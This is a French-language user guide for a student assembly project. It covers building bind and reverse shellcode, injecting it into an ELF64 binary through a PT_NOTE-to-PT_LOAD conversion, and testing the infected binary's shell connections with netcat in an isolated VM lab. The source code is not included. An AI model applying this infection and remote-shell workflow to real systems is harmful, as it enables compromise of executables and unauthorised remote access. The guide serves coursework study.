# ASM1 — Guide utilisateur ELF64 / Assembleur x86-64

**ESGI 3A — Projet assembleur**  
**Étudiants :** Thomas Kappler et Théo Robert  
**Environnement :** Ubuntu 24.04, x86-64, NASM

---

## 1. Présentation du projet

Le projet ASM1 porte sur l'étude des exécutables ELF64, leur chargement en mémoire et la transformation d'un Program Header `PT_NOTE → PT_LOAD`.

Il comprend :

- Un programme témoin : `victime.asm`.
- Un module expérimental de manipulation ELF : `injecteur.asm`.
- Une variante du module : `injecteur_reverse.asm`.
- Deux programmes assembleur dédiés aux modèles réseau bind et reverse : `bindshell.asm` et `reverseshell.asm`.
- Un fichier `INTERFACE.md` définissant le contrat entre les modules.

Ce guide explique comment préparer l'environnement, compiler les fichiers, exécuter le programme témoin, analyser les exécutables et vérifier les communications réseau.

## 2. Répartition du travail

| Étudiant | Responsabilités |
|---|---|
| Théo Robert | Analyse ELF64, Program Headers et manipulation des métadonnées ELF. |
| Thomas Kappler | NASM, bind/reverse, syscalls, PIC, processus et observations réseau. |
| En commun | Tests, documentation, interface entre modules et soutenance. |

## 3. Prérequis

Le projet utilise Ubuntu 24.04 sur une architecture x86-64.

Installer les outils :

```bash
sudo apt update
sudo apt install -y nasm gcc binutils xxd file gdb netcat-openbsd iproute2 iputils-ping psmisc
```

Vérifier les installations :

```bash
nasm -v
gcc --version
ld --version
objcopy --version
readelf --version
objdump --version
file --version
nc -h
```

Pour les tests réseau, prévoir deux machines virtuelles Ubuntu sur un réseau Host-only.

## 4. Accéder au projet

Ouvrir un terminal dans le dossier du projet puis vérifier les fichiers disponibles :

```bash
pwd
ls -la
```

Arborescence attendue :

```text
ASM1/
├── victime.asm
├── injecteur.asm
├── injecteur_reverse.asm
├── bindshell.asm
├── reverseshell.asm
└── INTERFACE.md
```

Certains fichiers binaires et objets seront générés pendant la compilation.

## 5. Compiler et exécuter le programme témoin

### 5.1. Compilation

```bash
nasm -f elf64 victime.asm -o victime.o
gcc -no-pie -nostartfiles -o victime victime.o
```

### 5.2. Exécution

```bash
./victime
```

Sortie attendue :

```text
Programme original execute avec succes !
```

### 5.3. Vérification du fichier ELF64

```bash
file victime
readelf -h victime
readelf -l victime
readelf -S victime
objdump -d victime
```

Afficher uniquement le point d'entrée :

```bash
readelf -h victime | grep -Ei 'entry|entrée'
```

Vérifier la présence du segment `PT_NOTE` :

```bash
readelf -l victime | grep NOTE
```

Exemple de résultat :

```text
NOTE  0x0000000000000120  0x0000000000400120  0x0000000000400120
```

Les valeurs dépendent de l'exécutable généré et des options de compilation.

## 6. Compiler les composants du modèle bind

### 6.1. Compilation du programme assembleur

```bash
nasm -f elf64 bindshell.asm -o bindshell.o
objcopy -O binary -j .text bindshell.o bindshell.bin
```

Fichiers générés :

- `bindshell.o` : fichier objet ELF64.
- `bindshell.bin` : contenu binaire brut de la section `.text`.

### 6.2. Compilation du module ELF

```bash
nasm -f elf64 injecteur.asm -o injecteur.o
ld -o injecteur injecteur.o
```

### 6.3. Vérification des fichiers

Afficher les fichiers générés :

```bash
ls -lh bindshell.o bindshell.bin injecteur
```

Examiner les premiers octets :

```bash
xxd bindshell.bin | head -20
```

Examiner les derniers octets :

```bash
xxd bindshell.bin | tail -3
```

Rechercher visuellement la séquence `48 b8` :

```bash
xxd -g 1 bindshell.bin | grep -i '48 b8'
```

Cette séquence peut correspondre au début d'une instruction `mov rax, imm64` en x86-64. La recherche sur la sortie de `xxd` est indicative : les octets recherchés peuvent se trouver à cheval sur deux lignes.

Désassembler le fichier objet :

```bash
objdump -d -M intel bindshell.o
```

## 7. Compiler les composants du modèle reverse

### 7.1. Configurer l'adresse IP cible

Le fichier reverseshell.asm contient l'adresse IP de la machine d'écoute.
Cette valeur est à modifier avant compilation si le réseau change.

Chercher la ligne :

    mov dword [rsp+4], 0x9A12A8C0

Pour calculer la valeur correspondant à votre IP :

    python3 -c "import socket, struct; print(hex(struct.unpack('<I', socket.inet_aton('IP'))[0]))"

Remplacer 'IP' par l'adresse de la machine d'écoute (ex : '192.168.18.154').
Remplacer ensuite la valeur 0x9A12A8C0 par la valeur obtenue.

Après modification, recompiler (voir section 7.2).

### 7.2. Compilation du programme assembleur

```bash
nasm -f elf64 reverseshell.asm -o reverseshell.o
objcopy -O binary -j .text reverseshell.o reverseshell.bin
```

### 7.3. Compilation du module reverse

```bash
nasm -f elf64 injecteur_reverse.asm -o injecteur_reverse.o
ld -o injecteur_reverse injecteur_reverse.o
```

Si le fichier est absent, il doit être préparé conformément à l'interface du projet. Une simple substitution de nom de fichier ne garantit pas la compatibilité des deux variantes.

### 7.4. Vérifications

Afficher les fichiers produits :

```bash
ls -lh reverseshell.o reverseshell.bin
```

Afficher les premiers et les derniers octets :

```bash
xxd reverseshell.bin | head -20
xxd reverseshell.bin | tail -3
```

Rechercher la séquence `48 b8` :

```bash
xxd -g 1 reverseshell.bin | grep -i '48 b8'
```

Désassembler les instructions :

```bash
objdump -d -M intel reverseshell.o
```


## 8. Étudier les modifications ELF64

### 8.1. Vérifier le point d'entrée initial

```bash
readelf -h victime | grep -Ei 'entry|entrée'
```

### 8.2. Examiner les Program Headers

```bash
readelf -l victime
```

Filtrer les segments `LOAD` et `NOTE` :

```bash
readelf -l victime | grep -E 'LOAD|NOTE'
```

### 8.3. Lancer l'injection

 Lancer l'injecteur puis vérifier son code de retour :

```bash
./injecteur
echo "Code de retour : $?"
```
L'injecteur utilise le fichier binaire produit à partir de bindshell.asm. Pour tester le reverse, utiliser injecteur_reverse.
Un code `0` indique généralement que la commande précédente s'est terminée avec succès. Il ne garantit pas que le programme compilé fonctionnera correctement.

### 8.4. Lancer le binaire infecté

lancement du code en binaire infecté :

```bash
./victime_infectee
```

Le fichier victime_infectee est produit par ./injecteur

## 9. Vérifier les communications réseau

Les communications sont étudiées dans un laboratoire isolé composé de deux machines virtuelles Ubuntu configurées sur un réseau Host-only.

- **VM1 :** machine hébergeant le programme étudié.
- **VM2 :** machine utilisée pour tester les connexions.

### 9.1. Configuration des machines virtuelles

Sur chaque VM, afficher les interfaces réseau :

```bash
ip -br addr
```

Identifier l'adresse IPv4 associée à l'interface Host-only.

### 9.2. Vérifier la connectivité

Depuis VM1 :

```bash
ping -c 4 IP_VM2
```

Depuis VM2 :

```bash
ping -c 4 IP_VM1
```

Remplacer `IP_VM1` et `IP_VM2` par les adresses relevées précédemment.

Si les machines peuvent communiquer, les réponses ICMP apparaissent dans le terminal. Un échec peut provenir de la configuration réseau ou du pare-feu.

### 9.3. Tester une connexion entrante avec Netcat (bind)

Le modèle bind repose sur une machine qui attend une connexion entrante.

**Sur VM1 — Terminal 1 :**

Lancer le shellcode pour ouvrir le port :

```bash
./victime_infectee
```

**Sur VM1 — Terminal 2 :**

Vérifier que le port est ouvert :

```bash
ss -tlnp | grep 4444
```


**Sur VM2 :**

Se connecter à VM1 :

```bash
nc IP_VM1 4444
```
Le shellcode affiche [+] VM infectee sur la connexion.

Remplacer `IP_VM1` par l'adresse IP Host-only de VM1.


### 9.4. Tester une connexion sortante avec Netcat (reverse)

Le modèle reverse repose sur une machine qui établit une connexion sortante vers une autre machine en écoute.

**Sur VM2 — Terminal 1 :**

Démarrer l'écoute sur le port `4444` :

```bash
nc -lvnp 4444
```

**Sur VM1 — Terminal 1 :**

Lancer le programme pour se connecter :

```bash
./victime_infectee
```

L'adresse IP de VM2 doit être renseignée dans reverseshell.asm avant compilation (voir section 7). Le binaire victime_infectee doit avoir été produit par injecteur_reverse.

**Résultat attendu sur VM2 :**

```text
Listening on 0.0.0.0 4444
Connection received on IP_VM1 XXXXX
```

Le numéro `XXXXX` correspond au port source utilisé pour la connexion.

Le message doit apparaître sur VM2.

**Important :** dans le modèle reverse, VM2 doit commencer à écouter avant que VM1 tente de se connecter, sinon la connexion peut être refusée.

Ces deux tests valident les communications TCP entre les VM, mais ne prouvent pas à eux seuls le fonctionnement des shellcodes assembleur.

### 9.5. Arrêter les connexions de test

Pour arrêter Netcat, utiliser `Ctrl+C` dans les terminaux concernés.

Vérifier qu'aucun service n'écoute encore sur le port `4444` :

```bash
ss -tlnp | grep 4444
```

Si aucune ligne n'est affichée, aucun service TCP en écoute sur ce port n'a été trouvé.


## 10. Nettoyage du projet

Après les tests, il est possible de supprimer les fichiers générés lors de la compilation.

### Supprimer les fichiers objets et binaires bruts

```bash
rm -f *.o *.bin
```

### Supprimer les exécutables générés

```bash
rm -f victime victime_infectee
rm -f injecteur injecteur_reverse
```

### Vérifier le dossier

```bash
ls -la
```

Les fichiers sources `.asm`, `INTERFACE.md` et la documentation restent conservés.

---
